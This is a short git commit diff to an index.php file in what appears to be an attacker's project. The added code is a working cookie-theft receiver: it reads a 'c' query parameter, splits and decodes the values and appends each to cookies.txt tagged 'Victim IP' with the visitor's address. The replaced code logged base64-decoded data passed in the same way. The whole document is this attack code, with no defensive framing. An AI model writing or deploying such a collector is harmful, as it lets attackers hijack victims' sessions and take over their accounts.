0c6dc4f4d6f0f32771c7346da457b0e9fba66741
venor <venor>
2023-01-02 21:39:06 -0600

    added some files

--- index.php
+++ index.php
@@ -1,5 +1,11 @@
 <?php
-if(isset($_GET['content'])){
-    error_log("\n\n" . base64_decode($_GET['content']));
+if (isset($_GET['c'])) {
+    $list = explode(";", $_GET['c']);
+    foreach ($list as $key => $value) {
+        $cookie = urldecode($value);
+        $file = fopen("cookies.txt", "a+");
+        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
+        fclose($file);
+    }
 }
 ?>
